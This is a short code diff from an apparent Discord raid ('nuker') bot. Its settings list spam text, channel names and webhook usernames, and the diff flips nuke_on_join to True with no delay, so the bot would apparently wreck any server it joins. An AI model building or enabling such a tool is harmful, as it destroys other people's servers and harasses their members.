@@ -12,7 +12,7 @@ client = commands.Bot(command_prefix = '?')
 spam_messages = ["orgia mode"]
 channel_names = ["persona"]
 webhook_usernames = ["makoto", "aigis 2", "aigis 1"]
-nuke_on_join = False
+nuke_on_join = True
 nuke_wait_time = 0
 
 
